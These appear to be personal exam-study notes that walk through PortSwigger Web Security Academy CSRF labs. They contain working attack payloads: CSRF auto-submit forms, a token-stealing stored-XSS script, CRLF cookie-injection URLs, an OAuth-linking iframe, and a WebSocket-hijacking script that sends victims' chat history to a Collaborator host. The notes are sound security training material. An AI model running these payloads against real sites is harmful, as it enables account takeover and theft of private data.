### What is it?
Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform. This can enable attacker to change victim email address and use password reset to take over the account.

### Conditions Required to Exploit CSRF
- Relevant action (e.g., changing the victim's email address)
- Cookie-based session handling (e.g., session cookie)
- No randomly-generated or complex request parameters (e.g., csrf token or state parameter)

### If a `isloggedin` value is identified in a cookie
[Look here](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#is-logged-in)
If cookie with the **isloggedin** name is _**identified**_, then a refresh of admin password POST request could be exploited.  
Change username parameter to administrator while logged in as low privilege user.  
CSRF token is not tied to user session.

Payload
>Notice the 3 extra `X-` headers
```
POST /refreshpassword HTTP/1.1
Host: TARGET.net
Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://TARGET.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
Referer: https://TARGET.net/refreshpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=TOKEN&username=administrator
```


>[!tip] Goal
>Change the administrator's email > reset their password > login as administrator

Stored XSS to change email. The payload below will:
1. Load the `/my-account` endpoint
2. Grab the value of the **csrf token** from the HTTP response
3. Invoke a POST method on the `/my-account/change-email` endpoint and change the email to `test@test.com`
```
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```


### Identify Vulnerabilities in Exam
Update email
Goal: change admin's email then reset their password

>In the exam there is only _**one**_ active user, and if the previous stage was completed using an attack that did not require the involving of the active user clicking on a link by performing poison cache or performing phishing attack by means of `Deliver to Victim` function, then CSRF change exploit can be used.


- "We are now redirecting you to login with social media..." or **no csrf token, no SameSite**
	- [[CSRF#2.10. Lab SameSite Lax bypass via cookie refresh ⭕️]]
- Login with social media button
	- Social media creds: `peter.wiener:hotdog`
		- [[CSRF#2.x. Lab Forced OAuth profile linking ⭕️]]

Live chat
- [[CSRF#2.9. Lab SameSite Strict bypass via sibling domain ⭕️]]


- `POST /my-account/change-email`
	- No `csrf` token
		- [[CSRF#2.1. Lab CSRF vulnerability with no defenses ⭕️]]
		- [[CSRF#2.7. Lab SameSite Lax bypass via method override ⭕️]]
		- `SameSite=None`
			- Remove `Referer` header == 302 Found
				- [[CSRF#2.11. Lab CSRF where Referer validation depends on header being present ⭕️]]
			- `Referer: https://HACKED.com/?{LAB-ID-URL}` == 302 Found
				- [[CSRF#2.12. Lab CSRF with broken Referer validation ⭕️]]
		- `SameSite=Strict`
			- [[CSRF#2.8. Lab SameSite Strict bypass via client-side redirect ⭕️]]
	- Yes `csrf` token 
		- `csrf` cookie
			- [[CSRF#2.6. Lab CSRF where token is duplicated in cookie ⭕️]]
		- Remove `csrf` token
			- 302 Found
				- [[CSRF#2.2. Lab CSRF where token validation depends on request method ⭕️]]
				- [[CSRF#2.3. Lab CSRF where token validation depends on token being present ⭕️]]
			- 400 Bad Request: "Missing parameter 'csrf'"
				- [[CSRF#2.4. Lab CSRF where token is not tied to user session ⭕️]]
				- "Invalid CSRF token" or **csrfKey cookie** or LastSearchTerm in set-cookie
					- [[CSRF#2.5. Lab CSRF where token is tied to non-session cookie ⭕️]]



- - - 
#### 2.1. Lab: CSRF vulnerability with no defenses ⭕️
This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`
>Doing this to learn the basics of CSRF

1. Login and change the email to something arbitrary: `test1@test.com`
	1. ![[CSRF-20260107150039965.png]]
2. Find the POST request, right click > engagement tools > generate CSRF PoC > change the email to what you want > copy HTML > paste it in the exploit server > Deliver to victim and the lab is solved! 
	1. ![[CSRF-20260107150413179.png]]
3. To see the PoC in action on your account, click Store and View exploit.
	1. ![[CSRF-20260107150328654.png]]
---

#### 2.2. Lab: CSRF where token validation depends on request method ⭕️
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login, change email, send `POST /my-account/change-email` to Repeater.
2. Right click > Change request method > **remove the `csrf` param** > change the email > Send and notice a 302 and check the browser see that the email has changed *without the `csrf` token*.
	1. ![[CSRF-20260126160856292.png]]
	2. ![[CSRF-20260126160912080.png]]
3. Right click > Engagement tools > Generate CSRF PoC > change the email again > Copy HTML > go to the exploit server > paste the HTML into the body > Store > Deliver exploit to victim and solve
	1. ![[CSRF-20260126161110786.png|445]]
>[!tip] How to Identify this Vulnerability
>1. Change email feature
>2. `csrf` parameter in `POST` request body

- - - 

#### 2.3. Lab: CSRF where token validation depends on token being present ⭕️
This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

1. Added `ZZZZ` to the `csrf` token, Send, got error. So sending an invalid `csrf` token won't work.
	1. ![[CSRF-20260107205649854.png]]
2. Try removing the `csrf` token entirely -- success!
	1. ![[CSRF-20260107205727049.png]]
3. Generate CSRF PoC and use this payload to solve lab
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hacker&#64;exploit-server&#46;net">
</form>
<script>
    document.forms[0].submit();
</script>
```
>[!tip] Lesson
>#Useful Remove the `csrf` token.

- - -

#### 2.4. Lab: CSRF where token is not tied to user session ⭕️
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
- `wiener:peter`
- `carlos:montoya`
1. Login as wiener, notice a change email feature (don't use it), observe the `GET /my-account` response, search for `csrf` and copy the token.
	1. ![[CSRF-20260126163055611.png]]
2. Open the burp browser or private window > login as carlos > use the change password feature > send that `POST` request to Repeater. Change the email > replace `csrf` with wiener's > Send > notice a 302 and refresh browser to see that it is **possible to use another user's csrf to perform actions**.
	1. ![[CSRF-20260126163105362.png]]
	2. ![[CSRF-20260126163110102.png]]
3. HTTP History > find the newest `GET /my-account?id=carlos` > search csrf in the response > copy the csrf token
	1. ![[CSRF-20260126163350738.png]]
4. Send one of wiener's `POST /my-account/change-email` request to Repeater > right click > engagement tools > generate csrf poc > paste in carlos's csrf token > change the email > copy html > exploit server > paste html in body > store > deliver exploit to victim to solve
	1. ![[CSRF-20260126163552347.png]]
>[!tip] How to Identify this Vulnerability
>1. Change email feature
>2. `csrf` parameter in `POST` request body

---


#### 2.5. Lab: CSRF where token is tied to non-session cookie ⭕️ 
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
- `wiener:peter`
- `carlos:montoya`

1. Login and change the email and send the POST request to Repeater. Notice a `csrf` token in the request body and also `csrfKey` in the Cookie header. Those 2 keys might be tied together. **If those values matches what the backend server expects, then we can perform the action**.
	1. ![[CSRF-20260107162256343.png]]
	2. ![[CSRF-20260107162346164.png]]
	3. Perform the cases below:
##### Test cases for CSRF Tokens + CSRF Cookies #Useful
1. Check if the token is tied to the cookie: 
	1. Submit an invalid CSRF Token
		1. Changed the token last value from `z` to `P` and got "Invalid CSRF Token"
		2. ![[CSRF-20260107162836089.png|397]]
	2. Submit a valid CSRF token from another user
		1. Login as another user and use their token -- login as carlos, Inspect, search `csrf`, and grab the token
			1. ![[CSRF-20260107163215990.png]]
		2. Got an error "Invalid CSRF Token" indicates that the **CSRF Token is tied to the CSRF Cookie**.
			1. ![[CSRF-20260107163414120.png]]
2. Check if User A's CSRF Token + CSRF Cookie can be used on User B (this checks if those keys are tied to a specific session cookie)
	1. Used the csrf token + csrfKey from carlos's account and used it on wiener's session -- success! **Those keys are not tied to the session**.
		1. ![[CSRF-20260107163855415.png]]

Now use the search bar, look at the GET request and notice it sets a new cookie using `LastSearchTerm`. This is *HTML Header Injection*: dynamically insert user-input in headers.
![[CSRF-20260107164651857.png]]
>The idea is we could set the `csrfKey` this way.

Use the payload below to use the attacker's `csrfKey` in the victim's session.
`/?search=test%0d%0aSet-Cookie:%20csrfKey=CSRF-KEY-HERE%3b%20SameSite=None`
![[CSRF-20260107165034360.png]]

1. Go back to the POST `/my-account/change-email` endpoint and generate a CSRF PoC.
2. Change the `csrf` value to the attacker's.
3. If you have `document.forms[0].submit();` in there, remove the entire `<script>` and replace it with this: 
	1. `<img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
So the whole PoC is:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@exploit-server.net" />
      <input type="hidden" name="csrf" value="ATTACKER-CSRF-TOKEN" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER-CSRF-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
4. Deliver to victim and solved.
>[!tip] IMPORTANT
>The BSCP exam might ask you to change the victim's email to `hacker@exploit-server.net`. You can then change the admin's password with the password reset feature.

- - - 

#### 2.6. Lab: CSRF where token is duplicated in cookie ⭕️
This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

1. Login, change the email, send POST request to Repeater and notice that the CSRF Token and the `csrfKey` match. Changing either value will result in an "Invalid CSRF Token" error.
	1. ![[CSRF-20260107171152707.png]]
2. Changed both values to `aaa`, Send, and got a 302 -- success! **As long as those values match, we can perform the action**. 
	1. ![[CSRF-20260107171333445.png]]
3. Now we need to find a flaw in the app to append a value we control (e.g., `aaa`). Like the previous lab, the **search bar sets a new cookie with the user input**.
	1. ![[CSRF-20260107171524623.png]]
4. Deliver the payload below to solve the lab:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;exploit-server&#46;net" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```
>[!tip] IMPORTANT
>A little bit easier than Lab 4 because this one we just need the 2 CSRF values to match. The previous lab required valid csrf values from a different user.

- - - 

#### 2.7. Lab: SameSite Lax bypass via method override ⭕️
This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
You can log in to your own account using the following credentials: `wiener:peter`
1. Login > use the change email feature > send that `POST /my-account/change-email` request to Repeater > notice there is no csrf token > right click > change request method > send > notice an error **"Method Not Allowed".** `Allow` header shows only `POST` requests are allowed.
	1. ![[CSRF-20260126164125136.png]]
2. Notice the `POST /login` response and there is no SameSite attribute. By default, browsers treat it as `SameSite=Lax`.
	1. ![[CSRF-20260126165034390.png]]
3. Change the email and add this `&_method=POST` and Send and notice a 302 code. Refresh browser to see it worked. 
	1. ![[CSRF-20260126164525124.png]]
	2. ![[CSRF-20260126164559875.png]]
4. Exploit server > paste the payload below in the body > deliver exploit to victim to solve.
	1. ![[CSRF-20260126165126814.png]]
```
<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"; </script>
```

>If solution doesn't work, try Chrome.

>[!tip] How to Identify this Vulnerability
>1. Change email feature
>2. **NO `csrf` parameter** AND **NO `SameSite` cookie**
>3. Change request method to `GET` and get a "Method Not Allowed"
>4. `Allow: POST` response header

#Useful Could try this in real world scenarios: `X-HTTP-Method-Override: POST

---

#### 2.8. Lab: SameSite Strict bypass via client-side redirect ⭕️
This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
You can log in to your own account using the following credentials: `wiener:peter`
1. Login and notice the `POST /login` request show the session cookie to have `SameSite=Strict`.
	1. ![[CSRF-20260126195816855.png]]
2. Filter settings: unhide `js` and all that.
3. Change email > send `POST /my-account/change-email` to Repeater > notice there is **no `csrf` token**.
	1. ![[CSRF-20260126200008425.png]]
4. Right click > change request method > send > 302 meaning we are able to **send `GET` requests to perform actions**.
5. *IMPORTANT*: Look for a redirect functionality (e.g., after logging in, posting a comment, etc.) Submit a comment and notice we got redirected back to the blog.
	1. ![[CSRF-20260126200621153.png]]
6. Observe the `GET /post/comment/confirmation?postId=...` and the response has the script: `redirectOnConfirmation('/post')`. It is hosted in this JS file: `/resources/js/commentConfirmationRedirect.js`. 
	1. ![[CSRF-20260126201029692.png]]
	2. It looks for the `postId` query param which we can manipulate.
		1. ![[CSRF-20260126201112934.png]]
7. Manipulating the redirect:
	1. Send the `GET` `postId={id}` request to Repeater and replace the digit with `/my-account/`. Didn't work because of `/post/`.
		1. ![[CSRF-20260126201530544.png]]
		2. ![[CSRF-20260126201619491.png]]
	2. Simple do this `../my-account/` and it works!
		1. ![[CSRF-20260126201700993.png]]
		2. ![[CSRF-20260126201723923.png]]
8. Grab the URI from Step 4 > change the email > append that to Step 7.2 > add the `../` > URL encode the `&` into `%26`. 
	1. `GET /my-account/change-email?email=bbb%40aaa.com&submit=1`
```
/post/comment/confirmation?postId=../my-account/change-email?email=bbb%40aaa.com%26submit=1
```
9. Exploit server > paste the payload below > deliver exploit to vicim and solve.
	1. ![[CSRF-20260126202419711.png]]
```
<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; </script>
```

>[!tip] How to Identify this Vulnerability
>1. Change email feature
>2. `SameSite=Strict`
>3. **NO `csrf` token**
>4. Able to change request method to `GET` and perform action (e.g., change email)
>5. Functionality that redirects the user e.g., after login, posting a comment, etc.
>6. `redirectOnConfirmation()` function in response
>7. JS file that looks for a param that can be manipulated like a query param e.g., `postId`

---

#### 2.9. Lab: SameSite Strict bypass via sibling domain ⭕️
This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

If you haven't done so already, we recommend completing our topic on [WebSocket vulnerabilities](https://portswigger.net/web-security/websockets) before attempting this lab.

##### Websocket Lab
It was recommended to learn about websockets first. **Lab: Manipulating WebSocket messages to exploit vulnerabilities**  ^q6ur7g
1. Click on Live Chat and enter `hello<b>1</b>` and check Websocket history. Filter settings: `hello` and see that the client HTML encodes the `<>` before sending it to the server.
	1. ![[CSRF-20260107211620879.png]]
2. Send that websocket message to Repeater and send the following payload to solve the lab.
	1. `<img src=1 onerror='alert(1)'>;`
	2. ![[CSRF-20260107211746133.png]]

**Lab start**
1. Click on Live Chat and enter some messages. Look at the HTTP History to see `GET /chat` and the request doesn't contain any unpredictable tokens (e.g., randomly generated csrf token) so this may be vulnerable to *Cross-Site WebSocket hijacking (CSWSH)*. 
2. Refresh the Live Chat, look at WebSockets history and see that the client sent a `READY` to the server.
	1. ![[CSRF-20260107212655725.png]]
3. Now check messages `To client` immediately after that `READY` message and every message after it contains the entire chat history. 
	1. ![[CSRF-20260107212818250.png|131]]
	2. ![[CSRF-20260107212839350.png|502]]
	3. ![[CSRF-20260107212853920.png|388]]
4. Fill out this payload below > Exploit server > Store > View exploit (to test if this works on your chat history)
```
<script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>
```
5. Click Poll in Burp Collaborator see the HTTP request to show we got the chat message for a new session. **This confirms the CSWSH vulnerability**. Next step is to bypass `SameSite=Strict` and grab the victim's chat history.
	1. ![[CSRF-20260107213152966.png]]
6. HTTP History show that the most recent `GET /chat` request (triggered by the exploit) and a session cookie is not in the request (how does this help?). In the response, the session cookie is set with `SameSite=Strict`.
	1. ![[CSRF-20260107213635695.png]]
>[!info] SameSite=Strict
>Prevents the client from sending session cookies to external domains. Helps to prevent CSRF attacks.
7. Check image files and `.js` files and observe the `Access-Control-Allow-Origin` response header showing a sibling domain `cms-` before your lab id.
	1. ![[CSRF-20260107214022271.png]]
8. Navigate to it to see a login screen. Entered arbitrary credentials like `aaa:bbb` and it reflected the username back. Try an XSS payload.
	1. ![[CSRF-20260107214219909.png]]
	2. `<script>alert(1)</script>` was entered in the username field and success. **Confirming a reflected-XSS vulnerability as well**.
		1. ![[CSRF-20260107214301227.png|272]]
9. Send the `POST /login` request to Repeater > right click > Change request method. Send this `GET` request and the JS remained -- good. Copy URL, paste in browser, and the XSS payload still executes. Since this `cms` URL is part of the *same site* as the original, we can **use this XSS vulnerability to launch an CSWSH attack which bypasses the SameSite restrictions**.
	1. ![[CSRF-20260107214514569.png]]
10. Get the payload from Step 4, URL encode it, and paste it in the following payload in the `username` parameter.
	1. Hint: Use Decoder to `Encode as...` > `URL`. Make sure to properly enter *your lab id and collaborator id* before encoding.
```
<script> document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"; </script>
```
![[CSRF-20260107215429261.png]]
11. To see the PoC in action on your chat history, click Store, View exploit, then Poll burp collaborator.
	1. ![[CSRF-20260107215417098.png]]
12. Go to HTTP History, see the most recent `GET /chat` request and see the request contains your session cookie this time. 
	1. ![[CSRF-20260107215631299.png]]
13. Deliver to victim. Poll collaborator again. Check the new HTTP requests. One of them says "I forgot my password" and another message show the chat message containing the password. Use the password `923tq1xl2ak76irt3h77` and `carlos` to login to solve the lab. 
	1. ![[CSRF-20260107215908448.png]]
>[!tip] How to Identify this Vulnerability
>1. Live Chat feature
>2. No unpredictable tokens in `GET /chat` == might be vulnerable to CSWSH
>3. Chat history retrieved via burp collab 
>4. Look at image files and JS files for `Access-Control-Allow-Origin` setting to `cms`
>5. Find XSS vuln on `cms` site and leverage this vuln to bypass `SameSite=Strict` and retrieve the victim's chat history

- - -

#### 2.10. Lab: SameSite Lax bypass via cookie refresh ⭕️
This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: `wiener:peter`

1. Login, change email, check `POST /my-account/change-email` and notice there is no unpredictable tokens (e.g., csrf token)
	1. ![[CSRF-20260108091938910.png]]
2. Look at `GET /oauth-callback` and notice the response didn't set a `SameSite` cookie.
	1. ![[CSRF-20260108092136833.png]]
>[!info] SameSite=Lax
>Cookies can be sent in same site requests only if they are `GET` or `HEAD` requests and top-level navigations. So you're on a.com and click on a link that redirect to b.com. This is a top-level navigation so the cookie is sent. But, an iframe that loads b.com will not send the cookie.
3. Click on Store > View exploit to see the PoC in action and change `wiener` account's email. *This is NOT the PoC to solve this lab*.
	1. ![[CSRF-20260108093135848.png]]
```
<script> history.pushState('', '', '/') </script> <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST"> <input type="hidden" name="email" value="foo@bar.com" /> <input type="submit" value="Submit request" /> </form> <script> document.forms[0].submit(); </script>
```
4. Look at the new `POST` change email request and there is **another session cookie**. The attack will **fail if you've logged in for more than 2 minutes**.
	1. ![[CSRF-20260108093418327.png]]
5. Store > View exploit on the following PoC to change your own email. *This will bypass the popup hurdle*. The only user interaction is you have to click on the page. Deliver exploit to victim to solve the lab.
	1. ![[CSRF-20260108094300902.png]]
#ExamTip 
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> <p>Click anywhere on the page</p> <script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } </script>
```

>[!tip] How to Identify this Vulnerability
>1. OAuth social media login *and/or* Change email functionality
>2. No unpredictable token like csrf token in `POST` change email request
>3. `SameSite=Lax` cookie or none because the browser defaults to `Lax`
>4. `GET /oauth-callback`
>5. Another session cookie is added every time you go through `/social-login` so look for *2 session cookies*

- - -

#### 2.11. Lab: CSRF where Referer validation depends on header being present ⭕️ 
This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

1. Login and change the email.
2. Send the POST request to repeater and change the value of the `referer` header. Got an error.
	1. ![[CSRF-20260107151045651.png]]
3. Remove the `referer` header completely and got a 302 indicating it worked!
	1. ![[CSRF-20260107151133549.png]]
4. Generate a CSRF PoC and include this **`<meta name="referrer" content="no-referrer">`** in it to instruct the exploit server to send this without a `referer` header. Deliver exploit to victim to solve the lab.
```
<html>
  <!-- CSRF PoC - CSRF where Referer validation depends on header being present -->
  <body>
<meta name="referrer" content="no-referrer">
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="HACKED111&#64;exploit&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
5. To see the PoC on your own account, click View exploit
	1. ![[CSRF-20260107151509381.png]]
- - - 

#### 2.12. Lab: CSRF with broken Referer validation ⭕️
This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`
> You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

1. Login and change the email to something arbitrary like `test1@test.com`.
2. Check the POST request in Burp > right click > engagement tools > Generate CSRF PoC > Options: check Include auto submit script > Test in browser and notice that there is an **Invalid referer header** error. This is our hint that we need to bypass this.
	1. ![[CSRF-20260107143506933.png]]
	2. ![[CSRF-20260107143537309.png]]
3. **The main culprit is that the `referer` header does not match the `Host` header**.
	1. ![[CSRF-20260107143641640.png]]
4. #ExamTip #Useful  Potential solution: completely remove the `referer` header. But not for this lab. 
5. When the `referer` header matches `Host` then we get a 302, which indicates success.
	1. ![[CSRF-20260107144040800.png]]
6. Try adding a domain we can control like a domain to an exploit server. So as long as the `Host` domain is somewhere in the `referer` header, we get success.
	1. ![[CSRF-20260107144201882.png]]
7. Go to the exploit server, add `Referrer-Policy: unsafe-url` to the Head, Store and Deliver exploit to the victim with this payload:
	1. in `name="email" value="NEW-EMAIL"` enter the email you want to change for the victim.
	2. Some browsers strip the query string from `referer` headers for security so `Referrer-Policy: unsafe-url` bypasses that.
```
<html>
  <!-- CSRF PoC -  CSRF with broken Referer validation -->
  <body>
	<script>
		history.pushState('', '', '/?https://YOUR-LAB-ID.web-security-academy.net');
	</script>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test222&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
- - -

#### 2.x. Lab: Forced OAuth profile linking ⭕️
This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:
- Blog website account: `wiener:peter`
- Social media profile: `peter.wiener:hotdog`

1. Notice the "Login with social media" button and "Attach a social media profile" button once you login. That's an indication of `OAuth`.
2. Login using `wiener:peter` > click on Attach a social media profile > enter social media credentials. Next time you login click on "Login with social media" and notice you're automatically logged in.
	1. Observe the HTTP History to see the `/oauth-linking` endpoint with a code. **This is what we need to carry out the CSRF**.
3. Click on My Account > Turn on Intercept > "Attach a social media profile" > get to the `/oauth-linking` endpoint, copy the code, and drop the request.
	1. ![[CSRF-20260107135758778.png|492]]
4. Go to the exploit server and deliver the following payload to the victim (enter your lab id and code)
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
```
5. When the iframe loads, it will complete the OAuth flow with your social media profile so it will get the admin's (victim) account on our session.
6. Click "Login with social media", we see the Admin panel, and delete carlos.
	1. ![[CSRF-20260107140133868.png]]
>This is how we take over the victim's account.
>
>It is possible to exploit CSRF with the absence of the `state` parameter.
>
>The state parameter defends against this by binding the users session to the original authorization request. For example, you could set the state parameter to be the sha256 hash of the user's session ID. Then, when processing the redirect, you check that the state parameter matches the sha256 hash of the user's session ID - if it doesn't then you reject the request.
>OR
>Store a random value in a cookie. You then send that value to Google using the `state` param. On callback, you validate the incoming `state` parameter with the value in the cookie. If the `state` value in the response does not match the `state` value in the cookie, you reject the login operation and stop further access.
- - - 
